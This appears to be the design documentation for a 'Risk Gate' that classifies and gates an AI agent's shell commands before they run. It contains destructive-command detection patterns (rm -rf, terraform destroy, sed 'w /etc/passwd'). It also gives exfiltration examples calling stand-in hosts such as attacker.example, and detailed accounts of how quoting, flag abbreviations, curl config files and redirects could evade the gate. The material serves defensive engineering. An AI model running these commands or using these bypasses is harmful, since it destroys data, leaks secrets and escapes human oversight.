# Risk Gate

> **Status: complete (Phase 7 #1 through #6).** The Risk Gate is live
> and authoritative at the `harness policy intercept` boundary. The
> interceptor builds the Action Envelope (#2), classifies risk (#3),
> resolves the environment (#4), evaluates `policy.when:` (#5), and
> enforces the four-way `allow / warn / require_approval / deny`
> decision (#6): `deny` and `require_approval` abort the tool call,
> `require_approval` clears once a `risk-approved:${SESSION_ID}` ledger
> tag exists (written by `harness approve risk`). The built-in
> `dangerous-shell` classifier + `gate-prod-destructive` policies ship
> in `harness init --template full`, and `harness doctor` reports Risk
> Gate wiring health. See [`ROADMAP.md`](ROADMAP.md#phase-7-risk-gate).

## What the Risk Gate is

The Phase 4 policy layer evaluates one rule per matching trigger and
returns a binary `block` / `allow`. It matches on the *tool call*: a
tool name, an optional command regex, an optional path glob.

The Risk Gate classifies *the action itself* before deciding. Between
the inbound tool event and the policy decision it inserts four stages:

```
Tool call
  → Action Envelope Builder   normalise the runtime event into a stable shape
  → Context Resolver          classify the target environment
  → Risk Classifier           assign severity + categories + reversibility
  → Policy Evaluator          match when: + requires: against the enriched envelope
  → Decision                  allow | warn | require_approval | deny
```

The motivating failure mode: an agent runs `psql $PROD_DB -c 'DROP TABLE
users;'`, `kubectl delete namespace prod`, or `terraform destroy`
against an unverified production target. A bare regex can spot `DROP
TABLE`, but whether that is safe depends on context the regex cannot
see: is `$PROD_DB` production or a disposable test container, is there
an approval on record, is the action reversible. The Risk Gate makes
that context a first-class, declarative input to the decision.

Long-form design and rationale:
[`lava-ice-logs/2026-04-30/harness-risk-gate-extension.md`](https://github.com/LanNguyenSi/lava-ice-logs/blob/master/2026-04-30/harness-risk-gate-extension.md).

## Where the Risk Gate lives

The Risk Gate lives **entirely inside harness**, layered onto the
Phase 4 `harness policy intercept` runtime. It is not a separate CLI and
not an `agent-grounding` component.

```
harness          declares and enforces the boundary  (this feature)
agent-grounding  records and verifies the evidence    (the ledger backend)
agent runtime    proposes actions
hooks            integration surface into the runtime
```

This is not a new split: `harness policy intercept` is already the
`PreToolUse` runtime path, and it already reads the evidence ledger
through `grounding-mcp` (`ledger_summary` to query, `ledger_add` to
record decisions). The Risk Gate extends that existing path with the
envelope / classifier / resolver stages. `agent-grounding` gains no
risk-gate code: a `require_approval` decision is satisfied by an
ordinary ledger tag, written by a `harness approve` verb and read by the
same requires-evaluator the Phase 4 policies already use.

## Manifest reference

### Risk classifiers (`risk:`)

*Status: parsed and validated (Phase 7 #1). Consumed by the Risk
Classifier as of Phase 7 #3, inspectable with `harness test-risk`. Wired
into `harness policy intercept` as of Phase 7 #5.*

```yaml
risk:
  classifiers:
    - name: dangerous-shell        # unique within risk.classifiers[]
      tool: Bash                   # the tool whose input the patterns run against
      patterns:
        - pattern: 'rm\s+-rf\s+(/|/var|/data|/mnt|~)'
          categories: [destructive, data_loss]
          severity: critical
        - pattern: 'terraform\s+destroy'
          categories: [destructive, infrastructure_change]
          severity: critical
```

(Shown here in its simplest form for readability; the actual shipped
`docs/examples/full-manifest.yaml` / `harness init --template full`
pattern is the flag-tolerant, linear-time form covered later in this
document under "Environment resolvers", not this literal string.)

Each `patterns[]` entry maps a regular expression to a set of
`categories` and a `severity`. The regex is validated at parse time;
an unparseable pattern is a `harness validate` error.

`severity` is a closed, ordered scale: `low`, `medium`, `high`,
`critical`. The ordering is what a `when.risk.severity_at_least` clause
compares against.

`categories` is a closed enum, deliberately fixed rather than
free-form so a typo (`data-loss` for `data_loss`) is a validate-time
error instead of a clause that silently never matches:

`destructive`, `data_loss`, `production_mutation`, `credential_access`,
`secret_exfiltration`, `network_exfiltration`, `deployment_change`,
`infrastructure_change`, `privilege_escalation`, `irreversible_action`,
`mass_update`.

A new category is a schema addition, not operator config. If a team
needs a category outside this set, that is a signal to extend the enum
in a PR, not a reason to make the field free-form. Operator-defined
categories are a possible v2 escape hatch, noted but not committed.

#### Built-in benign harness commands

Before any operator classifier runs, the Risk Classifier recognizes
harness's own read-only and gate-producer subcommands as a `low`-severity
floor. Without it, those commands would be unclassified, and the
"unknown is not safe" rule (below) would let a
`when: { risk.severity_at_least: critical, environment.name: production }`
policy HARD-DENY `harness preflight` the moment a session resolves to
production (a `main` / `release` branch), deadlocking against the
`require-preflight-evidence` gate that demands that very command.

The recognized commands are: `preflight`, `session-start`, `approve`,
`doctor`, `validate`, `describe`, `list`, `diff`, `explain`,
`explain-action`, `explain-policy`, `test-risk`, `resolve-env`, `audit`,
`session-export`, `dry-run`, `export`, `help`. Mutating subcommands
(`apply`, `init`, `add`, `adopt`, `remove`, `pack`, `uninstall`,
`migrate-home`, `smoke`, `gate`, `pause`, `resume`) are deliberately
excluded and stay classifiable.

It is a floor, not an override:

- It composes under the same highest-severity-wins rule, so
  `harness preflight && rm -rf /var` still classifies `critical`: the
  dangerous tail wins and the command stays blocked.
- An operator classifier can only *raise* severity above the floor (a
  `critical` pattern on a harness command wins); it cannot sink below it.
- The match is anchored at the command head. `cd /repo && harness preflight`
  is *not* recognized and stays unclassified (fail-safe = denied): a
  benign prefix must not launder a non-harness command.

Inspect it with `harness test-risk`: the debug verb reports the same
classification the runtime gate uses.

#### Built-in read-only commands

A second `low`-severity floor recognizes any *provably read-only* Bash
command (`git status`, `git diff`, `grep`, `cat`, `ls`, `head`, `cd`,
`npm audit`, `npm ls`, `sort FILE`, `tree DIR`, `file FILE`, ...),
reusing the same metachar-hardened classifier the understanding gate uses
to allow reads without an approved report
(`src/runtime/read-only-bash.ts`). It exists for the same reason as the
harness-command floor: without it, a release cut on a `main` / `release/*`
branch resolves to production and the "unknown is not safe" fail-close
lets a prod-scoped `risk.severity_at_least` policy deny harmless reads
(`git diff`, `grep version package.json`) mid-release. The recurring
workaround was `harness pause`, which silences *every* gate during the
most sensitive flow; this floor removes that incentive (friction-log
#38/#40/#43/#50).

Some bins are classified read-only only when their write flags are absent
(per-bin guards, analogous to `find`):

- `sort`: read-only when none of its write or exec flags appear: `-o` /
  `--output` (output file), `--compress-program=PROG` (runs an arbitrary
  program on spill temp files, an exec vector), or `-T` /
  `--temporary-directory` (scratch write to a caller-chosen path). Output
  is also caught in a short-flag cluster containing `o`, and the temp-dir
  flag in a cluster containing uppercase `T`. The guard enumerates every
  write/exec vector, not just output redirection.
- `tree`: read-only when neither `-o` / `--output` (separate, glued, or
  long-with-equals) nor a short-flag cluster containing `o` appears. tree
  has no exec or temp-dir flag.
- `file`: read-only when neither `-C` / `--compile` nor a short-flag
  cluster containing uppercase `C` appears. Lowercase `-c` (magic-file
  check) is benign and is not blocked.
- `git`: a subcommand name in the read-only set is necessary but not
  sufficient — several mutate once given arguments (task `9d1fff1b`,
  measured against git 2.50.1). `isReadOnlyGitInvocation` applies a
  positive per-subcommand argument-form check: `branch`/`tag` read-only
  only with no non-flag operand (`git branch`, `git tag -l`; blocked:
  `git branch -D main`, `git tag v1`, and glued no-operand branch writes
  like `--set-upstream-to=`); `remote` only for the `show`/`get-url`
  verbs or a bare `-v` (blocked: `add`/`set-url`/`prune`/`update`);
  `fetch` only for bare or a single remote/URL (blocked: a second
  positional refspec, which can write an arbitrary local ref); `reflog`
  only for bare/`show`/flag-led forms (blocked: `expire`/`delete`/`drop`).
  Two vectors reach git's SHARED option parser / transport and are
  forfeited for EVERY git subcommand: `--output=<path>` (creates a file
  at parse time, on rev-list/shortlog/blame as well as diff/log/show) and
  `--upload-pack=`/`--exec=`/`--receive-pack=`/`ext::` (run a local
  binary). The forfeit is abbreviation-aware (task `62fa0542`, measured
  against git 2.50.1): it also matches any unambiguous GNU/BSD
  `getopt_long` prefix of `--upload-pack` (minimum 1 char past `--`,
  `--u`, unambiguous on `ls-remote`), `--exec` (minimum 3, `--exe`,
  `ls-remote`'s hidden legacy alias for `--upload-pack`), or
  `--receive-pack` (minimum 4, `--rece`, calibrated against `git push`;
  `--rec` alone is still ambiguous with `--recurse-submodules` on `push`
  and does not reach it) — the pre-fix exact-spelling-only guard let
  `git ls-remote --upl=/prog .` run `/prog` while classifying read-only.
  `--output` deliberately stays exact-match: measured directly, git
  accepts no abbreviation of it at all on any of these subcommands
  (`--o`..`--outpu` all error, none write). `branch`'s write flags
  (`--delete`/`--move`/`--copy`/`--force`/`--unset-upstream`/
  `--edit-description`/`--set-upstream-to`) are likewise
  abbreviation-aware now (same task): `git branch --unse` really unsets
  the upstream and `git branch --edi` really writes
  `branch.<name>.description` and spawns `$GIT_EDITOR`, both of which the
  pre-fix exact-spelling-only `BRANCH_WRITE_FLAGS` check missed. Conservative
  cost (over-blocked reads, use flag-only or glued `--flag=value` forms to
  stay floored): tag/branch listing with a pathspec or `--contains <ref>`,
  `git reflog <ref>`, `git fetch <remote> <ref>` and separated fetch flag
  values (`--depth 5`); `git status`/`git ls-files`/`git name-rev --u`
  (each resolves to an unrelated, harmless flag — `--untracked-files`,
  `--unmerged`, `--undefined` — but the global `--upload-pack` forfeit
  cannot see which subcommand it is resolving against). No new branch-flag
  over-block was found: none of the seven measured minimum prefixes above
  collides with any other `git branch` long option (see the measurement
  table in `isBranchWriteFlag`'s doc comment, `src/runtime/read-only-bash.ts`).
  Note `git ls-files --rec` / `git branch --rec` are NOT an over-block:
  an earlier draft of the `--receive-pack` abbreviation fix miscalibrated
  the minimum at 3 (`--rec`, ambiguous on `send-pack` only) instead of the
  measured 4 (`--rece`, the real minimum on `push`), which would have
  over-blocked `--rec` as a false `--receive-pack` match; the corrected
  minimum leaves `--rec` correctly read-only (real git resolves it to
  `--recurse-submodules`, unrelated and harmless). Out of scope (separate
  tasks): path-qualified `git -C <dir>` (5b5d1022) and config/env-borne
  vectors (`GIT_EXTERNAL_DIFF`, `protocol.ext.allow`). What is out of
  scope there is the WRITE-flag guard's handling of a `-C`-qualified
  write verb, not the read floor: a path-qualified READ
  (`git -C <dir> rev-list ...`, `git -C <dir> status`) does reach this
  floor and is classified `low`, because `skipGitGlobalOptions` walks
  past `-C <dir>` before the subcommand check runs. Measured directly
  against `isReadOnlyBashCommand`, unchanged by task 2929c5b7.

Two more entries floor a whole class of commands that were previously
unclassified and, on a production-resolved session (checked-out `main`
or `release/*`), blocked by a prod-scoped `risk.severity_at_least`
policy even though neither can write anything:

- `cd`: read-only unconditionally, like `pwd`. `cd` mutates only the
  invoking shell process's own working directory; it cannot write to
  the filesystem or touch production, and it has no flag whose value is
  an output path, so it needs no per-bin write-flag guard. A chained or
  redirected form (`cd /x && rm -rf /`, `cd $(evil)`) never reaches this
  floor: it is refused up front by the same shell-metacharacter /
  substitution guard described below, so only the bare navigation form
  is ever classified read-only.
- `npm`: a curated positive allowlist of read-only subcommands — `ls` /
  `list` (installed tree), `view` / `info` / `show` (registry metadata;
  `info` and `show` are npm's own aliases for `view`), `outdated`,
  `why` / `explain` (dependency-reason report), `ping` — plus `npm
  audit` and `npm audit signatures` (both reports). Only CANONICAL
  spellings are floored: aliases like `la` / `ll` (for `ls -la` / `ls
  -l`) and `v` (for `view`) are deliberately excluded, and stay gated
  rather than miscategorized.

  `npm audit fix` mutates the lockfile and `node_modules` and stays
  gated even though bare `npm audit` is floored. This is enforced as a
  POSITIVE shape, not a denylist on the literal word `fix`: every token
  after `audit` must either start with `-` (a flag) or be the literal
  `signatures`, or the whole command forfeits the floor. A denylist on
  `fix` is a shell-quoting bypass — `npm audit "fix"`, `'fix'`, `f''ix`,
  `fi"x"`, and `$'fix'` all reach npm as the plain argument `fix` (npm's
  own arg parsing strips the quoting) while none of those raw tokens
  equals the string `fix`, so an equality check on the untouched argv
  would silently pass every one of them through to the mutating path.
  The positive shape closes all such spellings, and any future npm
  subcommand this floor has not reasoned about, in one rule; it fails
  closed on any separated flag value (e.g. `npm audit --audit-level
  high`, `npm audit --omit dev`), an acceptable, conservative false
  negative — use the glued `--flag=value` form to stay floored.
  Deliberately NOT blocked: `npm audit -fix` (single dash) — verified
  npm 11.17.0 behavior is `Unknown cli config "--fix"`, report only, not
  the mutating `fix` arm.

  A `--registry` (including the per-scope `--@scope:registry` override),
  `--userconfig`, or `--globalconfig` token anywhere in an npm invocation
  forfeits the floor regardless of subcommand: these redirect npm's
  registry or config lookups to an operator-unverified location, so
  `npm audit --registry=http://attacker` (or the scoped
  `--@myorg:registry=http://attacker`) would submit the full dependency
  manifest to that host — exfiltration, not a safe read. This guard is a
  CLI-token check only: it does not and cannot see `registry` set via
  `.npmrc` or the `npm_config_registry` environment variable, which
  redirect npm identically but leave no argv trace.

  Every other npm subcommand (`install`, `ci`, `publish`, `update`,
  `version`, ...) stays unclassified: the allowlist is positive, not a
  denylist, so an npm verb this floor has not reasoned about is never
  assumed safe.

Bins excluded entirely from the floor (no per-bin guard possible):

- `uniq`: its output file is a positional operand, not a flag; detecting
  a write would require operand counting rather than flag scanning.
- `date`: the write flag `-s` (set clock) is ambiguous inside getopt
  clusters shared with benign flags (e.g. `-Iseconds` is `date -I
  FMT=seconds`, not `-I -s econds`).
- `hostname`: `hostname NAME` sets the hostname via a positional operand,
  not a flag.

The same guarantees hold:

- It is a floor, not an override: an operator classifier that flags a
  read-only command still wins, and a dangerous tail
  (`git diff && rm -rf /var`) keeps the higher severity.
- It only floors *read-only* commands. Mutations stay classifiable:
  `git commit` / `git push` / `git tag` / `npm version` are not floored,
  so gating the actual release mutations behind an operator override is
  unchanged.
- Any shell chaining, redirection, or command substitution forfeits the
  classification, so a write cannot be laundered behind a read-only head
  (`cat x > /etc/y`, `git diff | sh`, `$(...)` all stay unclassified and
  gated). The classifier inspects the full, uncapped command for this
  reason, so a write hidden past the 16 KiB subject cap cannot slip
  through either.

#### `sed` read-only floor (Risk Classifier only, task `2929c5b7`)

`sed` gets its own `low`-severity floor, and that floor is wired ONLY into
the Risk Classifier. It is exported from
`src/runtime/read-only-bash.ts` next to `isReadOnlyKubectlCommand` but is
deliberately NOT part of `isReadOnlyBashCommand`, for the same
blast-radius reason as the kubectl floor: the understanding-gate PreToolUse
blocker and the solution-acceptance write-guard
(`src/cli/pack/hook-solution-acceptance-writeguard.ts`) consume that shared
predicate directly and return "allowed" for anything it accepts BEFORE
their own checks run. An earlier round of this task folded `sed` (and a
since-removed `curl` recognition) into the shared predicate and thereby
widened the write-guard: `curl -o
<verdict-dir>/marker.json <url>`, `curl --output ...`, `sed
's/a/b/w <verdict-dir>/marker.json' f` and `sed -n 'w
<verdict-dir>/marker.json' f` all went from BLOCKED to ALLOWED. Pinned by
tests in `tests/cli/pack-hook-solution-acceptance-writeguard.test.ts`.

`curl` gets a floor too, wired the same way and for the same
blast-radius reason; see "curl read-only SHAPE floor" directly below for
why it is a narrower SHAPE grammar rather than an allowlist like this
one, and why that difference matters given this task's history.

The floor is an ALLOWLIST and fails closed. Every token after the head
must be recognized (a named read-only flag, such a flag's value, or a
plain operand); an unknown flag, an unknown short-cluster character, a
missing flag value, or a token carrying a live shell expansion forfeits
the floor. Forfeiting is cheap: the command stays unclassified, which is
approval-gated and never hard-blocked. Under-blocking is not cheap.

**Live shell expansion.** A token whose `$`, backtick, `{`, `}`, `*`, `?`,
`[` or `]` is not quoted away forfeits the floor, because the shell can
rewrite one such token into SEVERAL argv words and thereby smuggle a flag
past a token allowlist (`sed $FLAGS f` with `FLAGS='-i'`,
`sed -n 1p {-i,x}`). Quoting is honored: inside single quotes all of them
are literal, and inside double quotes the glob/brace characters are
literal while `$` and a backtick stay live. So `sed -n '$p' f` keeps the
floor while `sed -n "/$X/p" f` forfeits it. Quote the script to stay
floored.

**`sed`.** Floored to `low` only when every flag is on the read-only
allowlist (`-n`/`--quiet`/`--silent`, `-E`/`-r`/`--regexp-extended`,
`-e`/`--expression`, `-s`/`--separate`, `-z`/`--null-data`,
`-u`/`--unbuffered`, `--posix`) AND every script parses as a read-only sed
program. Because the flag set is an allowlist, `-i` in every spelling
(`-i`, `-i.bak`, the cluster `-ni`, `--in-place`, `--in-place=SUFFIX`) and
`-f`/`--file` forfeit by never being ON it, rather than by being
enumerated as write flags.

The script scan matters, and corrects a false premise an earlier round of
this task shipped ("without `-i`, sed only writes to stdout"). It does
not: sed's `w FILE` command and the `s///w FILE` substitution flag write
an operator-named file with no `-i`, no redirection and no shell
metacharacter, `-f SCRIPTFILE` executes a script this classifier never
reads, and GNU sed's `e` command and `s///e` flag execute a shell command.
The scan therefore accepts only scripts built from addresses (a line
number, `$`, `/regex/`, a `first,last` or `first~step` range, optional
`!`) plus the commands `p P d D n N h H g G x l = q Q z F`, `{`/`}`
blocks, branch/label commands (`b t T :`), `y///`, and `s///` whose flags
are drawn from `g p i I m M` and digits only. Anything else, including an
unterminated regex or a custom `\c...c` address delimiter, forfeits.
Examples that keep the floor: `sed -n '1,5p' f`, `sed -E 's/a/b/' f`,
`sed -n -e '/x/p' f`, `sed -n '/warning/p' f`. Examples that forfeit:
`sed 's/a/b/w /etc/passwd' f`, `sed -n 'w /etc/passwd' f`,
`sed '1e rm -rf /' f`, `sed -f script.sed f`, `sed -ni f`.

#### curl read-only SHAPE floor (Risk Classifier only, task `fdaad781`, decision D-026)

`curl` gets its own `low`-severity floor, wired ONLY into the Risk
Classifier, exported as `isReadOnlyCurlCommand` from
`src/runtime/read-only-bash.ts` next to `isReadOnlySedCommand` and
`isReadOnlyKubectlCommand`, and deliberately NOT part of
`isReadOnlyBashCommand` -- same blast-radius reason as the sed and
kubectl floors: the understanding-gate PreToolUse blocker and the
solution-acceptance write-guard consume that shared predicate directly
and would treat "recognized" as "allowed" before their own checks run.

**Decision D-013's history is why this floor is a SHAPE, not a flag
list.** Task `2929c5b7` shipped a curl-specific `low` floor twice and it
leaked twice:

- Round 2 used a DENYLIST of write flags. Every flag nobody had
  enumerated passed: `-o`, `-O`, `-D`, `-c`, `-K`, `--create-dirs`.
- Round 3 replaced it with a flag ALLOWLIST, which fixed those. It still
  admitted `-w`/`--write-out` as inert, but since curl 8.3.0 that flag's
  format string can carry the `%output{FILE}` directive, which writes a
  local file (verified against curl 8.7.1). So `curl -s -w
  '%output{/etc/x}p' <url>` floored to `low` and left the approval gate
  entirely.

Both leaks share one root cause: deciding a curl invocation is inert by
NAMING its flags requires knowing every curl flag's write capability
across every curl version an operator might have installed, and a `low`
floor grants the strongest exemption there is -- the action drops out of
every `severity_at_least` tier, not just `critical` -- so a single
mis-read flag is a full bypass. Round 3's review removed the floor
entirely (decision D-013) rather than patch a third flag onto the list,
on exactly that premise.

**Round 2 hardening (adversarial review of this task's own round 1).**
A skeptical re-review of the SHAPE floor's round-1 shipment measured
three more leaks in the same family -- a flag or default nobody had
reasoned about, again -- and this round closes each, changing the
grammar below:

- **The curlrc auto-load, HIGH.** curl auto-loads
  `$CURL_HOME/.curlrc`, `$XDG_CONFIG_HOME/curlrc`, or `~/.curlrc`
  BEFORE looking at any other argument, unless `-q`/`--disable` is the
  FIRST argument on the command line. A curlrc can set `output`,
  `request`, `data`, or `upload-file`, so round 1's `curl -s '<url>'`
  (no `-q`) was itself a write vector through an operator-invisible
  config file, not through anything on argv. Measured against curl
  8.7.1: a `~/.curlrc` containing `output = <file>` made a bare
  `curl -s '<url>'` write `<file>`; the identical invocation with `-q`
  inserted as the first argument left the file untouched. `-q`/
  `--disable` is now MANDATORY as the second word (right after `curl`),
  not merely allowed: a spelling that omits it forfeits, even though
  every other word would otherwise fit the shape.
- **`-L`/`--location`, HIGH.** Dropped from the closed set. Measured
  against curl 8.7.1: `curl -L -H 'X-Api-Key: secret' 'http://a/start'`
  answered with a 302 to a different host on plaintext http, and curl
  forwarded the `X-Api-Key` header to that second host unchanged --
  curl strips `Authorization`/`Cookie` on a cross-host redirect, not an
  arbitrary custom header. A shape that admits both `-L` and `-H`
  therefore lets an attacker-controlled redirect exfiltrate whatever
  the `-H` allowlist let through, to a host that was never the one
  argument this floor examined.
- **`-k`/`--insecure`, MEDIUM.** Dropped from the closed set. A
  deliberate TLS-verification bypass is a judgement call, not a shape
  this floor should make silently; it now stays approval-gated like
  any other choice that weakens the request's own guarantees.

Every "proven incapable of naming a file or a method" claim in this
floor now reads more narrowly, and means: no flag on this closed list
names a file, and the only method any of them selects is HEAD
(`-I`/`--head`), which is read-only; curl's config-file surface (the
one channel that could set one without appearing on argv at all) is
closed off by the mandatory `-q`. That is a claim about the one shape
this floor accepts, not a claim that curl as a whole has no other
config surface -- see "Residuals" below for what stays open.

This floor inverts the burden instead of re-litigating the list. It
recognizes ONE narrow invocation SHAPE and forfeits (stays unclassified)
on everything else, so a flag nobody has reasoned about here can only
widen the unclassified set -- it can never slip into `low` by omission,
which is precisely the shape of both D-013 leaks. `true` requires ALL of:

- No shell chaining, redirection, command substitution, background `&`,
  or a bare carriage return anywhere in the command (the same
  whole-string guard every floor in this file uses except
  `isReadOnlyBashPipeline`, which keeps its own narrower reject set so
  a bare `|` stays admissible there; the `\r` clause was added this
  round, see the header-value bullet below).
- The head is exactly `curl`: unquoted, no path prefix, no `env`/
  `command`/`sudo`/other wrapper. A wrapped or path-qualified head is a
  different spelling and forfeits here (it may still floor via
  `isReadOnlyBashCommand`'s generic `--help`/`--version` shape, unrelated
  to this floor, if it happens to match that unrelated two-token form).
- The SECOND word is exactly `-q` or `--disable`: unquoted, not inside a
  cluster (`-qs` does not count), and not merely present somewhere later
  in the command -- curl only honors it as the first argument, so
  nothing else satisfies this. See "Round 2 hardening" above for why.
- Exactly ONE operand: a single-quoted, unbroken word matching
  `` ^https://[A-Za-z0-9.-]+(:[0-9]+)?(/[^'\s{}[\]\\`$]*)?$ `` -- an
  `https://` host of letters, digits, `.` and `-` only, an optional
  `:PORT`, and an optional path excluding exactly: a single quote,
  whitespace, `{`, `}`, `[`, `]`, backslash, backtick, and `$`. `?` and
  `*` are NOT excluded (round 2: previously excluded, which forfeited
  the most common SINGLE-parameter read-only query-string spelling, a
  URL with one `?param=value`; a MULTI-parameter query string joined
  by `&` still forfeits even single-quoted -- see "Residuals" below).
  No userinfo (`user:pw@`) is reachable through this shape:
  the host class has no `:`/`@`, so `https://user:pw@x` cannot match
  end-to-end. An unquoted URL, a double-quoted URL, `http://`, a second
  operand, or a missing operand all forfeit.
- Every other word is a flag drawn from a closed allowlist, each PROVEN
  to name no file, with the only selectable method being HEAD
  (read-only): `-s`/`-S`/`-f`/`-I` (any combination in a cluster),
  `--silent`/`--show-error`/`--fail`/`--head`, and `-H`/`--header` or
  `-m`/`--max-time`/`--connect-timeout` -- each ONLY in the
  separate-token form (never glued, never `=`-joined, never repeated),
  with the header value quoted, not `@`-prefixed, and free of `$` or
  backtick. A `\n`/`\r` in the header value never reaches this
  per-value check at all: the whole-command guard above refuses either
  character anywhere in the command first (round 3: the per-value
  check's own now-redundant `\n`/`\r` clause was removed as dead code),
  and the timeout value is a bare `^[0-9]+$`. `-L`/`--location`
  and `-k`/`--insecure` are OFF this list now (round 2, see above).
  Anything off the list -- `-o`, `-O`, `-w`/`--write-out` in any
  spelling, `-d`/`-F`/`-T`/`-X`/`--request`, `-H`/`-b` with an `@FILE`
  value, `-u`, `--netrc`, `-x`, `--url`, `-L`, `-k`, an unknown flag, a
  glued or `=`-joined value -- forfeits the WHOLE command, not just
  that token.

**Header-value carriage return, MEDIUM (round 2).** Measured against
curl 8.7.1: a `-H` value carrying a bare `\r` with no paired `\n`
reaches curl's wire completely unmodified (`X-Foo: bar\rX-Injected:
evil\r\n`, byte for byte). A lenient downstream parser that treats a
bare `\r` as a line terminator reads that as two headers, which is
header injection through a value this floor's own quoting rules would
otherwise have accepted. `\r` is refused in the whole-command guard
above, so a `\r` anywhere -- inside a `-H` value or not -- forfeits the
entire command before any word is even split out; only leading or
trailing whitespace escapes that guard, stripped first by
`command.trim()`. Round 2 also added a duplicate `\r` (and `\n`) check
inside the per-value check for `-H`/`--header` specifically; round 3
removed that duplicate as unreachable dead code, since the
whole-command guard already forfeits before that check would ever run
(pinned directly in tests/runtime/read-only-bash.test.ts, next to the
shared guard's other metachar cases, so a regression that narrows the
one guard that actually matters is still caught).

Quoting is handled by a splitter built ONLY for this floor
(`splitCurlWords`), because the shape's own positive fixtures require a
quoted value containing a space (`-H 'Accept: application/json'`) to
parse as ONE token -- unlike every other floor in this file, which treats
`trimmed.split(/\s+/)` as "the" tokenizer and would tear that value into
two raw fragments. The splitter supports single and double quotes only,
with no escape or expansion handling, and fails closed (forfeits) on an
unterminated quote or a bare unquoted backslash. Its separator class is
space and tab only (round 2: narrowed from JS `\s`, which is a
superset of bash's default IFS -- an NBSP, vertical tab, form feed, or
ideographic space between two words is not whitespace to bash, and
treating it as a separator here could parse a single, malformed argv
word as two well-formed ones); newline and carriage return never reach
the splitter, refused by the whole-command guard first.

`curl` therefore floors `low` for exactly this shape and stays
UNCLASSIFIED for everything else that neither this floor nor the
DESTRUCTIVE floor below names -- the same fallback `ssh <host> <cmd>` and
`node -e` ride (see "Unclassified actions and the fail-close rule"
below): a production-scoped `gate-prod-destructive`
(`severity_at_least: critical`) does not hard-block it, and a
production-scoped `gate-prod-destructive-approval`
(`severity_at_least: high`) still requires operator approval.
Approval-gated, never hard-blocked, never silently allowed.

The tractable obligation this floor does not remove lives in the
DESTRUCTIVE floor below: name the spellings that are write-CAPABLE and
raise them to `high`. That direction still fails safe, because a curl
flag nobody has reasoned about there simply misses the raise and stays
unclassified (approval-gated) rather than being floored to `low` -- this
SHAPE floor and that DESTRUCTIVE floor compose under the same
highest-severity-wins rule as every other pair of floors in this file,
and the destructive floor is evaluated first in `risk-classifier.ts`, so
a recognized write-capable curl never also takes this `low` floor.

**Operator escape hatch.** If a broader curl shape is known-safe in your
deployment -- for instance, one that accepts `-L`/`-k`, or that never
requires `-q` because every session's `~/.curlrc` is controlled and
known-inert -- and the approval prompt this floor's forfeit produces is
noise, add an explicit `low` classifier pattern for exactly that shape
(an operator classifier composes with the floors and can raise or lower
nothing it does not name), or put a network egress control in front of
the agent. Both are deployment decisions with a named owner, which is
what a general curl allowlist could not be.

**Residuals.** What this shape still authorizes, or does not attempt to
close, even after round 2:

- **URL- and header-only exfiltration.** Even the narrowest curl shape
  this floor accepts can still fetch
  `curl -q -s 'https://attacker.example/collect'`, and the request line
  alone (host, path, query string, the small header/timeout surface
  above) is enough to carry operator-controlled data out. No flag
  analysis decides whether a URL is trustworthy; gate destinations with
  an operator classifier pattern or an egress control if that matters
  for your deployment. This residual is unchanged from the pre-D-013
  floor and from the D-013-through-D-026 unclassified interval: a curl
  floor, of either kind, has never closed it and does not claim to.
- **Proxy environment variables and `CURL_CA_BUNDLE`.** `http_proxy`,
  `https_proxy`, `ALL_PROXY`, `NO_PROXY`, and `CURL_CA_BUNDLE` (and
  their per-scheme/uppercase variants) can redirect or weaken every
  request this shape accepts, from OUTSIDE the command line this floor
  reads. Entirely outside this shape's scope: it only ever looks at the
  argv text of one curl invocation.
- **Version skew.** The closed flag list was proven inert against curl
  8.7.1, the version measured throughout this task. A different
  installed curl version could in principle attach new behavior to one
  of these flags; the D-013 history above is exactly this failure mode
  once already, for `-w`/`--write-out`.
- **`--libcurl`, `--alt-svc`, `--hsts`.** Each writes a local file and
  is named by neither this floor's allowlist nor the DESTRUCTIVE floor
  below's write-flag scan. Both are silent on them by omission, which
  is the intended fail-safe for an unnamed flag: they stay unclassified
  (approval-gated), never floored to `low`.
- **A `&` in the query string forfeits the WHOLE command, even
  single-quoted.** `CURL_SHAPE_URL_RE` does admit `&` in its path/query
  class, but `hasUnsafeShellMetachar` -- the whole-command guard every
  floor in this file shares (`isReadOnlyBashPipeline` excepted) --
  rejects any bare `&` in the raw command string with no quote
  awareness at all, the same guard that rejects the chained `&&`
  fixture. So a MULTI-parameter query string joined by `&`
  (`'https://x/search?q=abc&limit=10'`) never reaches
  `CURL_SHAPE_URL_RE` and stays unclassified, even though the operand
  is single-quoted and the shell itself cannot split on that `&`.
  Closing this would mean making the shared whole-command guard
  quote-aware, which every other floor in this file also relies on
  staying a simple, cheap raw-string scan; deliberately out of scope
  for this round. Round 2's `?`/`*` admission above therefore closes
  only the single-parameter query-string spelling, not the more common
  multi-parameter one.

#### Built-in destructive floor (task `2929c5b7`)

`src/runtime/destructive-shell-floor.ts` classifies a closed set of
mutating heads in the BINARY, composed into `classifyRisk` under the same
highest-severity-wins rule as every other floor. It is evaluated before
the benign floors, so a recognized mutating head never also takes a `low`
floor, and an operator pattern can always raise above it.

**Why it is code and not only a manifest pattern.** The
`risk.severity_at_least: critical` fallback change below ships in the
binary and takes effect for every install on upgrade. Its compensating
half, explicit classification for the heads that used to ride the blanket
fail-close, would otherwise take effect only for installs that ADOPT the
new `dangerous-shell` template patterns, because `harness init` writes a
manifest once and never rewrites it. An existing manifest would have taken
the loosened fallback and lost the hard block in the same upgrade. The
floor closes that upgrade path; the template patterns are its
operator-editable MIRROR, not the only line of defence.

| Severity | Recognized shapes |
| --- | --- |
| `critical` | `dd` with an `of=` target; `truncate` with `-s`/`--size` (glued `-s0` included); `shred`; `mkfs`, `mkfs.*`; `find ... -delete`; `find ... -exec`/`-execdir rm` |
| `high` | `git reset --hard`; `git push` with `--force`/`--force-with-lease`/`-f`/a `+refspec`; `git clean -f` (any cluster containing `f`) ; `git checkout .`, `git checkout -- .`, `git restore .`; `chmod`/`chown` with `-R`/`--recursive` (any cluster containing `R`); `sed -i` in any spelling; `curl` with a local-write flag, with a `-w`/`--write-out` format string carrying `%output`, with a body/non-GET-HEAD-method flag, or with an `@FILE` value on `-H`/`--header` or `-b`/`--cookie` |
